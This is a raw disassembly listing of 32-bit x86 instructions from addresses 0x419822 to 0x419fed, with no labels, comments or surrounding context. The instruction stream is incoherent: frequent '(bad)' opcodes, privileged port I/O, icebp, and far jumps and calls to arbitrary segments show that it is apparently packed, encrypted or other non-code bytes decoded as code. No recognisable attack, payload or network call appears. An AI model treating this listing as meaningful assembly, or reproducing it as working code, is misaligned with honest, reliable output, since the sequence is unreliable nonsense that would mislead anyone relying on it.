  419822:	mov    ah,0x93
  419824:	pop    ebp
  419825:	pop    esi
  419826:	push   ds
  419827:	add    al,0xec
  419829:	repnz sub BYTE PTR [esp+edi*8-0x4e],0x6d
  41982f:	gs leave 
  419831:	fidiv  DWORD PTR [esi-0x67352ba]
  419837:	xor    BYTE PTR [esi+0x72],bl
  41983a:	jno    0x41989e
  41983c:	in     eax,dx
  41983d:	or     edi,edx
  41983f:	ss pusha 
  419841:	pop    ecx
  419842:	pop    ecx
  419843:	push   ds
  419844:	inc    bl
  419846:	daa    
  419847:	and    DWORD PTR [ecx-0x4c],0xaebe8afc
  41984e:	push   0xffffffe9
  419850:	addr16 push ebp
  419852:	pop    esi
  419853:	ficomp DWORD PTR [esi-0x61]
  419856:	and    DWORD PTR [esi+0x40],edx
  419859:	push   ebx
  41985a:	dec    esp
  41985b:	jge    0x419885
  41985d:	addr16 imul eax,ecx,0x5c
  419861:	cdq    
  419862:	mov    bh,0xbf
  419864:	inc    esp
  419865:	or     esi,ecx
  419867:	aas    
  419868:	xchg   edi,eax
  419869:	aas    
  41986a:	jmp    0x64c1df70
  41986f:	add    ebx,esi
  419871:	cmp    bl,BYTE PTR [ecx+0x5c]
  419874:	ror    BYTE PTR [ebx-0x627fee1],1
  41987a:	adc    bl,BYTE PTR [ecx]
  41987c:	add    eax,DWORD PTR [esi+0x47]
  41987f:	mov    al,0x6b
  419881:	mov    edi,DWORD PTR cs:[edi-0x34367193]
  419888:	ss gs sub al,0xf7
  41988c:	addr16 (bad) 
  41988e:	push   0xeee1c81f
  419893:	(bad)  
  419894:	xchg   esi,eax
  419895:	sub    al,0xd5
  419897:	call   0xcf4eaf55
  41989c:	jge    0x419907
  41989e:	sbb    bl,BYTE PTR [edi+0x58ae6bb5]
  4198a4:	jp     0x4198bf
  4198a6:	retf   0x334d
  4198a9:	daa    
  4198aa:	lahf   
  4198ab:	sub    al,0x2b
  4198ad:	mov    ch,0x35
  4198af:	pop    es
  4198b0:	mov    bh,0xc6
  4198b2:	jbe    0x419859
  4198b4:	or     DWORD PTR [edx-0x356760c5],ecx
  4198ba:	pusha  
  4198bb:	xchg   ecx,eax
  4198bc:	cmp    eax,0x4f4fbf0f
  4198c1:	mov    ah,0x92
  4198c3:	xor    ebx,ecx
  4198c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198c6:	das    
  4198c7:	jae    0x419926
  4198c9:	inc    esp
  4198ca:	sahf   
  4198cb:	push   ebp
  4198cc:	not    DWORD PTR [esi-0x86055ea]
  4198d2:	pop    ebp
  4198d3:	dec    edx
  4198d4:	(bad)  
  4198d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198d6:	inc    ecx
  4198d7:	push   edx
  4198d8:	(bad)  
  4198d9:	(bad)  
  4198db:	xor    eax,0xf15768c7
  4198e0:	call   0xb437:0x8c8920bd
  4198e7:	rol    BYTE PTR [edx+0x1c01c090],1
  4198ed:	daa    
  4198ee:	mov    edi,edi
  4198f0:	test   BYTE PTR [edi],ah
  4198f2:	mov    esi,0xfaee4b25
  4198f7:	inc    edx
  4198f8:	pop    es
  4198f9:	add    bl,cl
  4198fb:	or     al,0x5d
  4198fd:	in     al,dx
  4198fe:	loop   0x4198e2
  419900:	cmp    al,BYTE PTR [esi-0x66]
  419903:	pop    ebx
  419904:	push   0xffffffa8
  419906:	jmp    0x47a7ad4b
  41990b:	mov    edx,0x27ba3387
  419910:	adc    al,0xd7
  419912:	fild   WORD PTR [ecx-0x67]
  419915:	lea    ecx,ds:0xdb9c8e66
  41991b:	repnz repz cmp ebx,esi
  41991f:	or     DWORD PTR [ecx-0x6d],edx
  419922:	mov    ch,0xd
  419924:	pop    eax
  419925:	adc    cl,ch
  419927:	out    dx,eax
  419928:	xchg   BYTE PTR [edi-0x7a],bh
  41992b:	xor    al,0xe3
  41992d:	xor    DWORD PTR [esi-0x6ac9b60d],ebx
  419933:	xor    esp,DWORD PTR [edi+0x6a]
  419936:	in     al,0xa2
  419938:	add    bl,BYTE PTR [eax]
  41993a:	stos   DWORD PTR es:[edi],eax
  41993b:	inc    ecx
  41993c:	stc    
  41993d:	data16 icebp 
  41993f:	push   esp
  419940:	dec    ebx
  419941:	fstp   QWORD PTR [edi]
  419943:	and    BYTE PTR [ecx],0x8a
  419946:	inc    eax
  419947:	scas   eax,DWORD PTR es:[edi]
  419948:	lock xchg ebp,eax
  41994a:	xchg   ebp,eax
  41994b:	mov    BYTE PTR [esi],ah
  41994d:	or     DWORD PTR [ebp-0x10],edx
  419950:	clc    
  419951:	repnz popf 
  419953:	push   ecx
  419954:	dec    ebx
  419955:	pop    eax
  419956:	iret   
  419957:	mov    dh,0x90
  419959:	mov    edi,0xae0d5126
  41995f:	test   eax,0x7d2c43ea
  419964:	jge    0x41998a
  419966:	fdiv   st(2),st
  419968:	fwait
  419969:	jae    0x419964
  41996b:	mov    ds:0x7c41182a,eax
  419970:	add    bl,dl
  419972:	sub    BYTE PTR [ebx-0x60231f56],dl
  419978:	std    
  419979:	mov    BYTE PTR [ecx],al
  41997b:	jne    0x419933
  41997d:	xchg   ebp,eax
  41997e:	rcr    DWORD PTR [ebp-0x63201b28],0xc8
  419985:	or     al,0xe6
  419987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419988:	addr16 (bad) 
  41998a:	and    DWORD PTR [edx+ebx*8+0x20c86f9e],eax
  419991:	mov    esp,edx
  419993:	push   ebp
  419994:	push   ebp
  419995:	outs   dx,BYTE PTR ds:[esi]
  419996:	jnp    0x4199cc
  419998:	daa    
  419999:	jae    0x419a17
  41999b:	(bad)  
  41999c:	retf   
  41999d:	pop    edi
  41999e:	cld    
  41999f:	mov    fs,WORD PTR [eax]
  4199a1:	mov    cl,0x93
  4199a3:	push   edi
  4199a4:	sbb    bl,BYTE PTR [ecx]
  4199a6:	xor    al,0xbb
  4199a8:	mov    esi,0xfd86c963
  4199ad:	pop    ds
  4199ae:	test   eax,0xaf2aa415
  4199b3:	(bad)  [esi+0x72]
  4199b6:	jnp    0x419a36
  4199b8:	jmp    0x1acb0a72
  4199bd:	sbb    DWORD PTR [edi+ecx*4-0x8],esi
  4199c1:	inc    ebx
  4199c2:	dec    edi
  4199c3:	xor    al,0xd0
  4199c5:	into   
  4199c6:	pop    ss
  4199c7:	es loope 0x4199b2
  4199ca:	scas   eax,DWORD PTR es:[edi]
  4199cb:	inc    ebx
  4199cc:	adc    al,0x42
  4199ce:	aad    0xa3
  4199d0:	push   eax
  4199d1:	mov    edi,0xf484bab
  4199d6:	mov    bl,ah
  4199d8:	test   DWORD PTR [edx-0x68],ebp
  4199db:	mov    WORD PTR [ebx],?
  4199dd:	fisubr DWORD PTR [edi+0xf]
  4199e0:	xchg   ecx,eax
  4199e1:	daa    
  4199e2:	scas   al,BYTE PTR es:[edi]
  4199e3:	dec    esi
  4199e4:	imul   ebp,DWORD PTR [edi+0x6108a33],0xdc6ee407
  4199ee:	loopne 0x419a21
  4199f0:	(bad)
  4199f4:	ins    DWORD PTR es:[edi],dx
  4199f5:	mov    ebx,0x4e379b08
  4199fa:	sbb    eax,eax
  4199fc:	pop    ebp
  4199fd:	aas    
  4199fe:	add    BYTE PTR [ebx+0x3a],dh
  419a01:	push   ebx
  419a02:	add    eax,0x7fd1b2b8
  419a08:	ror    ebx,1
  419a0a:	add    BYTE PTR [ebx+0x36b7a1c8],dl
  419a10:	es in  eax,dx
  419a12:	mov    cl,0xa
  419a14:	xor    DWORD PTR [edi+0xfa46039],0xffffffc3
  419a1b:	shr    BYTE PTR [ebp-0x4e],1
  419a1e:	xor    al,0x6d
  419a20:	mov    bh,0x4d
  419a22:	popf   
  419a23:	sar    dh,0x3a
  419a26:	shl    DWORD PTR [ecx],0x4b
  419a29:	std    
  419a2a:	jno    0x419a65
  419a2c:	(bad)  
  419a2d:	out    dx,eax
  419a2e:	mov    BYTE PTR [edx+ebp*1-0x35e4fa77],ah
  419a35:	scas   eax,DWORD PTR es:[edi]
  419a36:	jne    0x4199ef
  419a38:	and    DWORD PTR [eax+0x517b5450],ebx
  419a3e:	mov    ch,0x65
  419a40:	gs jns 0x419a48
  419a43:	fiadd  DWORD PTR [edi+0x7b49c769]
  419a49:	rol    BYTE PTR [esi-0xb],cl
  419a4c:	mov    al,0xcc
  419a4e:	js     0x4199fb
  419a50:	add    edi,edi
  419a52:	inc    esp
  419a53:	add    al,0x64
  419a55:	and    BYTE PTR [ebx-0x2b],ch
  419a58:	dec    eax
  419a59:	cmc    
  419a5a:	imul   esp,DWORD PTR [ebx],0xffffffde
  419a5d:	sub    al,0x18
  419a5f:	or     DWORD PTR [edi-0x60],ecx
  419a62:	mov    ch,0x96
  419a64:	cmp    eax,0xee370480
  419a69:	jae    0x419ab8
  419a6b:	jbe    0x419a76
  419a6d:	test   al,0x92
  419a6f:	adc    DWORD PTR [ebx+0x371d9b24],ebx
  419a75:	add    al,0xdc
  419a77:	pop    ds
  419a78:	xchg   ebp,eax
  419a79:	mov    cl,0x81
  419a7b:	inc    ebp
  419a7c:	icebp  
  419a7d:	pop    es
  419a7e:	cmp    al,0x58
  419a80:	and    DWORD PTR [ecx+0x24203694],0xffffffb1
  419a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a88:	xor    bl,al
  419a8a:	sahf   
  419a8b:	retf   
  419a8c:	and    al,0x88
  419a8e:	(bad)  
  419a90:	ins    BYTE PTR es:[edi],dx
  419a91:	repnz inc ebx
  419a93:	mul    DWORD PTR [edx]
  419a95:	(bad)  
  419a96:	es ret 0x89b6
  419a9a:	sbb    al,0x24
  419a9c:	push   edi
  419a9d:	dec    edx
  419a9e:	outs   dx,BYTE PTR ds:[esi]
  419a9f:	inc    edi
  419aa0:	shl    BYTE PTR [edi+0x16],cl
  419aa3:	push   es
  419aa4:	cmp    eax,0x5fd9e463
  419aa9:	xor    al,0xac
  419aab:	fistp  WORD PTR [esp+eax*8+0x39]
  419aaf:	pushf  
  419ab0:	inc    ebp
  419ab1:	ins    DWORD PTR es:[edi],dx
  419ab2:	mov    edx,0xc4008108
  419ab7:	pop    edx
  419ab8:	aad    0xae
  419aba:	out    dx,eax
  419abb:	xor    esi,edi
  419abd:	jge    0x419ae5
  419abf:	mov    bl,0x36
  419ac1:	sub    al,ah
  419ac3:	push   0x35
  419ac5:	mov    DWORD PTR [eax+0x7eed17d7],0x9da15592
  419acf:	pop    es
  419ad0:	inc    esi
  419ad1:	loope  0x419ae0
  419ad3:	sbb    al,0x2c
  419ad5:	inc    ecx
  419ad6:	aam    0xfd
  419ad8:	jmp    0x553c:0x85156be6
  419adf:	xor    esp,0x8a2363ed
  419ae5:	pop    eax
  419ae6:	sbb    cl,al
  419ae8:	jge    0x419b0f
  419aea:	push   esi
  419aeb:	das    
  419aec:	inc    BYTE PTR [edx]
  419aee:	mov    edi,0x126f2217
  419af3:	sahf   
  419af4:	aad    0xfd
  419af6:	ds xor dh,dh
  419af9:	mov    esi,0xa70fff89
  419afe:	int3   
  419aff:	pop    ebp
  419b00:	enter  0xd0e0,0xd3
  419b04:	xor    ah,ch
  419b06:	test   eax,0x1a352437
  419b0b:	test   eax,0x7105514d
  419b10:	adc    ebp,ecx
  419b12:	pop    esi
  419b13:	js     0x419b94
  419b15:	inc    eax
  419b16:	cmp    BYTE PTR [ecx+0x66aa4748],0x6a
  419b1d:	xor    eax,0x4940ad40
  419b22:	jg     0x419b3d
  419b24:	in     eax,0x39
  419b26:	ret    0xbbb7
  419b29:	cmp    bl,dh
  419b2b:	mov    edx,0xaa80d675
  419b30:	adc    ebp,DWORD PTR [edx+eiz*1+0x2f]
  419b34:	adc    eax,0x533815f7
  419b39:	je     0x419ae2
  419b3b:	ret    
  419b3c:	dec    eax
  419b3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b3e:	fdivr  DWORD PTR [edi+ecx*2]
  419b41:	xchg   ch,ah
  419b43:	mov    esi,0xba3924a3
  419b48:	test   al,0x1c
  419b4a:	ins    BYTE PTR es:[edi],dx
  419b4b:	imul   edi,DWORD PTR [ebx],0x60
  419b4e:	jge    0x419ad1
  419b50:	pop    es
  419b51:	outs   dx,DWORD PTR ds:[esi]
  419b52:	xor    al,0xd9
  419b54:	push   ebx
  419b55:	add    eax,0x50d0ebc0
  419b5a:	fwait
  419b5b:	int3   
  419b5c:	jo     0x419ae2
  419b5e:	aaa    
  419b5f:	mov    gs,WORD PTR [esi+0x51]
  419b62:	jb     0x419b84
  419b64:	sbb    al,0x4d
  419b66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b67:	ret    
  419b68:	xchg   DWORD PTR [ebx],edx
  419b6a:	idiv   dl
  419b6c:	adc    al,0xc4
  419b6e:	add    esi,DWORD PTR [esi-0x4373fb5d]
  419b74:	outs   dx,DWORD PTR ds:[esi]
  419b75:	add    BYTE PTR [ebx-0x6d97fa3],cl
  419b7b:	xchg   ebp,eax
  419b7c:	and    edi,ebp
  419b7e:	stos   DWORD PTR es:[edi],eax
  419b7f:	or     eax,0xd5ee8e24
  419b84:	jmp    0x7904:0x9775b015
  419b8b:	daa    
  419b8c:	adc    al,0x85
  419b8e:	inc    esi
  419b8f:	stos   DWORD PTR es:[edi],eax
  419b90:	xor    cl,BYTE PTR [eax]
  419b92:	jle    0x419be4
  419b94:	inc    ebx
  419b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b96:	shl    DWORD PTR [eax],0x83
  419b99:	ins    BYTE PTR es:[edi],dx
  419b9a:	call   0x8f15085e
  419b9f:	test   eax,0x3d47ca48
  419ba4:	hlt    
  419ba5:	or     DWORD PTR [ebx-0x62],eax
  419ba8:	int    0xe9
  419baa:	imul   edx,DWORD PTR [ecx-0x232ca4ac],0xfffffff9
  419bb1:	(bad)  
  419bb2:	mov    ebx,DWORD PTR [ebx]
  419bb4:	fsub   DWORD PTR [ecx-0x21]
  419bb7:	aaa    
  419bb8:	aam    0x43
  419bba:	dec    ecx
  419bbb:	cmp    esi,DWORD PTR [ebx+eax*8-0x53]
  419bbf:	repnz sahf 
  419bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bc2:	aam    0xc6
  419bc4:	fild   DWORD PTR [ecx+0x47]
  419bc7:	push   eax
  419bc8:	or     DWORD PTR [edi+0x45a1cc7],edx
  419bce:	inc    ecx
  419bcf:	dec    edx
  419bd0:	pusha  
  419bd1:	mov    eax,0x14fb541e
  419bd6:	lods   eax,DWORD PTR ds:[esi]
  419bd7:	add    DWORD PTR [esi+ebp*8+0x4b35e73f],edi
  419bde:	pop    ds
  419bdf:	push   esi
  419be0:	cmp    ah,BYTE PTR [edx+0x2d73d38f]
  419be6:	into   
  419be7:	pusha  
  419be8:	cmp    ebx,edx
  419bea:	or     BYTE PTR [edi+0x23],bl
  419bed:	push   esp
  419bee:	jle    0x419bbb
  419bf0:	mov    ebp,0x61326137
  419bf5:	hlt    
  419bf6:	mov    WORD PTR [ebp+0x7e16b4ca],?
  419bfc:	xlat   BYTE PTR ds:[ebx]
  419bfd:	leave  
  419bfe:	ja     0x419bf0
  419c00:	icebp  
  419c01:	pop    ebx
  419c02:	lods   eax,DWORD PTR ds:[esi]
  419c03:	ret    
  419c04:	imul   esi,DWORD PTR [edx],0x51
  419c07:	jb     0x419c39
  419c09:	mov    WORD PTR [edi-0x7c],ss
  419c0c:	cmp    ebx,DWORD PTR [edx-0x5b]
  419c0f:	div    DWORD PTR [edi+0x74640e4e]
  419c15:	jnp    0x419bb7
  419c17:	lea    esi,[ebp+0x51]
  419c1a:	ds mov cl,0xb1
  419c1d:	mov    esi,0x138fd5b2
  419c22:	js     0x419c6d
  419c24:	inc    ebx
  419c25:	inc    eax
  419c26:	sbb    BYTE PTR [eax],bh
  419c28:	sbb    al,0xf9
  419c2a:	mov    DWORD PTR [ecx+0x5],ecx
  419c2d:	pop    ss
  419c2e:	stos   BYTE PTR es:[edi],al
  419c2f:	xchg   ebp,eax
  419c30:	sbb    eax,0x997bc017
  419c35:	clc    
  419c36:	lods   eax,DWORD PTR ds:[esi]
  419c37:	xchg   edi,eax
  419c38:	add    ecx,DWORD PTR [edx-0x426ed394]
  419c3e:	add    eax,0x9d45684b
  419c43:	adc    cl,BYTE PTR [ebx+edi*8+0x6b]
  419c47:	loop   0x419bfa
  419c49:	xor    eax,0x971e53ce
  419c4e:	(bad)  
  419c4f:	outs   dx,BYTE PTR ds:[esi]
  419c50:	xor    DWORD PTR [edx-0x29aead6f],0x65
  419c57:	scas   al,BYTE PTR es:[edi]
  419c58:	jns    0x419c7a
  419c5a:	mov    edi,0x6766b9c1
  419c5f:	push   cs
  419c60:	aaa    
  419c61:	rol    ebx,0x4b
  419c64:	call   0xb4817d16
  419c69:	sub    DWORD PTR fs:[eax+ecx*4],eax
  419c6d:	test   eax,0xe0dd1dbb
  419c72:	jmp    0x3da0:0x424e9c09
  419c79:	jmp    0x2e4472d5
  419c7e:	call   0x2b94:0x2349f12a
  419c85:	(bad)  
  419c86:	pcmpgtd mm7,QWORD PTR ds:0xa6ada
  419c8d:	mov    al,0x89
  419c8f:	aad    0x51
  419c91:	xor    DWORD PTR [ecx],edi
  419c93:	jl     0x419cc9
  419c95:	add    bl,0xa7
  419c98:	enter  0x4071,0xad
  419c9c:	mov    al,0xe3
  419c9e:	scas   al,BYTE PTR es:[edi]
  419c9f:	neg    DWORD PTR ds:0xd11e38f1
  419ca5:	sbb    al,0x7b
  419ca7:	mov    eax,ds:0xa5fd92f6
  419cac:	lods   eax,DWORD PTR ds:[esi]
  419cad:	ja     0x419cce
  419caf:	xor    eax,0x997acaa4
  419cb4:	mov    esp,0xd8d92e41
  419cb9:	sub    eax,0xc083d41a
  419cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cbf:	jnp    0x419d11
  419cc1:	fiadd  DWORD PTR [eax-0x2b4cc15c]
  419cc7:	jge    0x419c8d
  419cc9:	adc    al,BYTE PTR [ecx+0x7282e15b]
  419ccf:	adc    al,0xbb
  419cd1:	push   cs
  419cd2:	jae    0x419d24
  419cd4:	(bad)  
  419cd5:	je     0x419c7d
  419cd7:	pop    es
  419cd8:	dec    edx
  419cd9:	sbb    bl,BYTE PTR [edi]
  419cdb:	nop
  419cdc:	mov    bh,0x47
  419cde:	fist   DWORD PTR [edx+eiz*4-0x17]
  419ce2:	add    BYTE PTR [ecx+edx*4-0x3232d10a],dh
  419ce9:	pusha  
  419cea:	push   ss
  419ceb:	jmp    0x5057:0x9bfcad60
  419cf2:	scas   al,BYTE PTR es:[edi]
  419cf3:	les    ebp,FWORD PTR [ebx-0x58]
  419cf6:	add    esp,eax
  419cf8:	sub    BYTE PTR [edi],bl
  419cfa:	jmp    0x419cb4
  419cfc:	in     al,dx
  419cfd:	popa   
  419cfe:	ja     0x419c85
  419d00:	data16 mov ah,0x29
  419d03:	jle    0x419d55
  419d05:	(bad)  
  419d07:	(bad)  
  419d08:	mov    eax,0xedeba559
  419d0d:	mov    ecx,DWORD PTR [ebx]
  419d0f:	sbb    al,0xbd
  419d11:	or     DWORD PTR [edx-0x12],edi
  419d14:	pop    ebp
  419d15:	jecxz  0x419cf5
  419d17:	mov    eax,ds:0xcc88eef7
  419d1c:	and    edi,DWORD PTR [ebp+esi*4+0x64]
  419d20:	pop    ebx
  419d21:	enter  0x94d8,0x95
  419d25:	(bad)  
  419d26:	push   edi
  419d27:	std    
  419d28:	mov    esp,0x2a53a217
  419d2d:	inc    edx
  419d2e:	(bad)  
  419d2f:	shr    DWORD PTR [eax+0x34fe2741],cl
  419d35:	aam    0x6
  419d37:	retf   
  419d38:	and    ah,al
  419d3a:	test   esi,0x9d205a10
  419d40:	dec    eax
  419d41:	and    DWORD PTR [esp+eax*4],ebp
  419d44:	inc    ebx
  419d45:	(bad)  
  419d46:	fstp   TBYTE PTR [eax+0x793522b0]
  419d4c:	add    BYTE PTR [ebp-0x43],0x3f
  419d50:	mov    dh,0xd2
  419d52:	xor    eax,ecx
  419d54:	inc    edx
  419d55:	sbb    edx,DWORD PTR [esi+0x739adbc2]
  419d5b:	xchg   ecx,eax
  419d5c:	addr16 sbb eax,0x78675eed
  419d62:	push   edi
  419d63:	out    0x25,al
  419d65:	xor    ebx,edi
  419d67:	call   0x675915f
  419d6c:	xchg   ecx,eax
  419d6d:	mov    dl,0x21
  419d6f:	cli    
  419d70:	inc    esi
  419d71:	cmp    DWORD PTR [edx+edi*2-0x5aee5715],ecx
  419d78:	imul   ebx,DWORD PTR [ebx],0xffffffd8
  419d7b:	cmp    DWORD PTR [eax+0x37],esi
  419d7e:	call   0x8ff:0x22779947
  419d85:	(bad)  [ecx-0x42]
  419d88:	cs jbe 0x419d1c
  419d8b:	(bad)  
  419d8c:	leave  
  419d8d:	mov    ebx,0xcdaf5b34
  419d92:	out    dx,al
  419d93:	lock lock mov al,ds:0x5d01daf0
  419d9a:	(bad)  
  419d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d9d:	mov    ebx,ecx
  419d9f:	aaa    
  419da0:	leave  
  419da1:	mov    ecx,0xd9ba67bd
  419da6:	test   esi,0xf57aadb9
  419dac:	mov    edi,ebp
  419dae:	dec    edx
  419daf:	pop    eax
  419db0:	dec    ecx
  419db1:	ret    
  419db2:	push   cs
  419db3:	lods   al,BYTE PTR ds:[esi]
  419db4:	cs cmp eax,0x4f9e75b7
  419dba:	cmp    ebx,edi
  419dbc:	clc    
  419dbd:	xchg   BYTE PTR [ecx-0x36],bh
  419dc0:	(bad)  
  419dc3:	scas   al,BYTE PTR es:[edi]
  419dc4:	mov    ds:0x81283ad9,al
  419dc9:	out    0xd8,al
  419dcb:	popf   
  419dcc:	lods   al,BYTE PTR ds:[esi]
  419dcd:	(bad)  
  419dce:	push   ecx
  419dcf:	rcr    DWORD PTR [edi-0x1f],1
  419dd2:	les    edx,FWORD PTR [ebx]
  419dd4:	clc    
  419dd5:	xor    BYTE PTR [edi+0x76d0d217],al
  419ddb:	push   edi
  419ddc:	push   ebx
  419ddd:	push   edi
  419dde:	bound  esp,QWORD PTR [esi+0x0]
  419de1:	cmp    esp,ebp
  419de3:	pop    ebx
  419de4:	push   ds
  419de5:	sub    DWORD PTR [edi],ebp
  419de7:	inc    ebp
  419de8:	mov    ebx,0xf2bed70
  419ded:	or     al,0x15
  419def:	sub    esp,DWORD PTR [eax+0x45]
  419df2:	adc    ebp,DWORD PTR ds:0xc82f0b7
  419df8:	aas    
  419df9:	mov    ss,WORD PTR [esi+0x73c1adf6]
  419dff:	push   esp
  419e00:	inc    ecx
  419e01:	fcom   DWORD PTR ds:0x5c2efba5
  419e07:	retf   
  419e08:	adc    cl,BYTE PTR [edx-0x5a]
  419e0b:	push   es
  419e0c:	cld    
  419e0d:	mov    ds:0x7ffde6d0,al
  419e12:	jge    0x419e1a
  419e14:	or     DWORD PTR [ecx-0x4ecf21b9],edi
  419e1a:	fistp  QWORD PTR [ebx-0x6834418e]
  419e20:	add    dh,ah
  419e22:	ret    
  419e23:	fwait
  419e24:	dec    esp
  419e25:	sub    eax,0xe39c5c8b
  419e2a:	jo     0x419e7f
  419e2c:	xor    BYTE PTR [ebp+0xb],dh
  419e2f:	popa   
  419e30:	cmovbe eax,eax
  419e33:	or     DWORD PTR es:[ebx+0x3ac5a7e5],esi
  419e3a:	xchg   DWORD PTR [eax],esi
  419e3c:	fistp  DWORD PTR [esi-0x49502d4b]
  419e42:	mov    ebp,0x1219f9d5
  419e47:	out    0xf1,al
  419e49:	cmp    eax,0x2831cab3
  419e4e:	outs   dx,BYTE PTR ds:[esi]
  419e4f:	sti    
  419e50:	ins    DWORD PTR es:[edi],dx
  419e51:	push   cs
  419e52:	movntq QWORD PTR [edi],mm3
  419e55:	retf   0x7932
  419e58:	stos   DWORD PTR es:[edi],eax
  419e59:	sbb    ch,BYTE PTR [ebx+0x47]
  419e5c:	mov    eax,ds:0x42957ec5
  419e61:	fucomi st,st(0)
  419e63:	and    BYTE PTR [edi],dl
  419e65:	mov    ss,WORD PTR [ebp-0x12607124]
  419e6b:	sub    eax,0xb22ece70
  419e70:	sub    BYTE PTR [eax-0x7b],ch
  419e73:	loope  0x419e92
  419e75:	jg     0x419ed1
  419e77:	retf   
  419e78:	or     eax,0x26bb822e
  419e7d:	fs jmp 0x419e92
  419e80:	in     al,0x1b
  419e82:	imul   esi,DWORD PTR [ebx-0x5b],0xffffffb7
  419e86:	mov    esi,0x769694c9
  419e8b:	mov    WORD PTR [ebx+0x63cb089c],es
  419e91:	pop    ecx
  419e92:	loop   0x419f0d
  419e94:	sub    eax,0x89155b7b
  419e99:	lods   eax,DWORD PTR ds:[esi]
  419e9a:	jns    0x419ed3
  419e9c:	add    DWORD PTR [ebx+0x329119d1],ecx
  419ea2:	pop    ecx
  419ea3:	mov    eax,0x11ab2fac
  419ea8:	cmp    dl,BYTE PTR [ecx-0x29]
  419eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419eac:	sub    BYTE PTR [ebp-0x1873b21a],bl
  419eb2:	xchg   ecx,edi
  419eb4:	cld    
  419eb5:	retf   0xb930
  419eb8:	mov    ecx,edx
  419eba:	push   cs
  419ebb:	inc    ebp
  419ebc:	ds stos BYTE PTR es:[edi],al
  419ebe:	pushf  
  419ebf:	ret    0xfdd2
  419ec2:	xchg   edx,eax
  419ec3:	call   0xe78f7e0d
  419ec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ec9:	and    dh,BYTE PTR [ebx]
  419ecb:	jmp    0x2368:0xa0e003f8
  419ed2:	sbb    ecx,DWORD PTR [edi]
  419ed4:	cmp    dl,BYTE PTR [ebp+0x9]
  419ed7:	fistp  WORD PTR [ecx-0xc9bb8d6]
  419edd:	or     bh,bh
  419edf:	mov    al,0x5e
  419ee1:	sbb    al,0x6
  419ee3:	xchg   DWORD PTR [edi-0x4892c539],ecx
  419ee9:	nop
  419eea:	scas   al,BYTE PTR es:[edi]
  419eeb:	xchg   esp,eax
  419eec:	mov    ch,0x75
  419eee:	jge    0x419f2f
  419ef0:	(bad)  
  419ef1:	je     0x419f0b
  419ef3:	sub    BYTE PTR ss:[edi],dl
  419ef6:	mov    DWORD PTR [ecx+0x545c5baf],edx
  419efc:	inc    ecx
  419efd:	aaa    
  419efe:	mov    WORD PTR [esi+edi*4],gs
  419f01:	fdiv   QWORD PTR [esi]
  419f03:	mov    ss,WORD PTR [esi+0x740eeee8]
  419f09:	inc    edx
  419f0a:	push   0xffffffd8
  419f0c:	jle    0x419f3d
  419f0e:	adc    edi,edx
  419f10:	jecxz  0x419f6f
  419f12:	jmp    0x8a8f992d
  419f17:	or     eax,0xb94d5372
  419f1c:	icebp  
  419f1d:	jae    0x419ef6
  419f1f:	sub    BYTE PTR [ecx-0x31dbcb61],0x79
  419f26:	cmp    al,0xa4
  419f28:	inc    edx
  419f29:	ins    DWORD PTR es:[edi],dx
  419f2a:	xchg   esi,ecx
  419f2c:	cmc    
  419f2d:	shr    DWORD PTR [edi+0x79],cl
  419f30:	fsubp  st(3),st
  419f32:	sub    DWORD PTR [eax-0x3019b655],ecx
  419f38:	stos   BYTE PTR es:[edi],al
  419f39:	pop    ebx
  419f3a:	(bad)  
  419f3c:	xor    eax,0xaf273945
  419f41:	push   edi
  419f42:	mov    WORD PTR [eax+eiz*4],cs
  419f45:	dec    ecx
  419f46:	test   BYTE PTR [eax+0x53787d5a],0x87
  419f4d:	mov    dh,0x0
  419f4f:	xchg   BYTE PTR ds:0x1e31257d,al
  419f55:	xor    eax,0x499fd25b
  419f5a:	adc    eax,0x9dc2cd68
  419f5f:	xor    ebx,edi
  419f61:	add    al,dl
  419f63:	add    eax,0xe60b58b6
  419f68:	jbe    0x419f2c
  419f6a:	or     eax,0xf139d9c1
  419f6f:	cmp    BYTE PTR [edx],ch
  419f71:	and    dh,BYTE PTR [eax+0x4dd75b81]
  419f77:	(bad)  
  419f78:	clc    
  419f79:	shl    al,0x1c
  419f7c:	push   ecx
  419f7d:	add    eax,0x94925f73
  419f82:	mov    al,0xc1
  419f84:	sbb    al,0x86
  419f86:	push   es
  419f87:	mov    al,0x57
  419f89:	xchg   edx,eax
  419f8a:	cdq    
  419f8b:	push   ebp
  419f8c:	push   0x2f
  419f8e:	sub    ah,BYTE PTR gs:[edi+0x5]
  419f92:	xor    edx,DWORD PTR ds:0xba9fdf14
  419f98:	jae    0x419f1c
  419f9a:	ret    0xdd12
  419f9d:	popf   
  419f9e:	jae    0x419fba
  419fa0:	adc    dh,BYTE PTR [ecx]
  419fa2:	es jmp 0x419f46
  419fa5:	test   al,0x4b
  419fa7:	gs dec ax
  419faa:	fidiv  WORD PTR [ebx]
  419fac:	sub    eax,0x117f44de
  419fb1:	cmp    ecx,edi
  419fb3:	adc    eax,0xc12f206b
  419fb8:	(bad)  
  419fb9:	bound  edi,QWORD PTR [ecx-0x785de175]
  419fbf:	or     al,0xc1
  419fc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fc2:	dec    ebp
  419fc3:	stc    
  419fc4:	and    DWORD PTR [ecx+0x5e],eax
  419fc7:	addr16 pop ds
  419fc9:	or     ch,BYTE PTR [ebx]
  419fcb:	jecxz  0x419fb3
  419fcd:	fidiv  DWORD PTR [edi]
  419fcf:	pop    edi
  419fd0:	jnp    0x419f62
  419fd2:	popa   
  419fd3:	cld    
  419fd4:	and    ebp,DWORD PTR [ecx+0x6648c329]
  419fda:	jmp    0x28b3:0x860f0f18
  419fe1:	pop    ecx
  419fe2:	or     edx,ebx
  419fe4:	jge    0x419fc6
  419fe6:	dec    edx
  419fe7:	sub    esp,0xeedf1738
  419fed:	push   edi
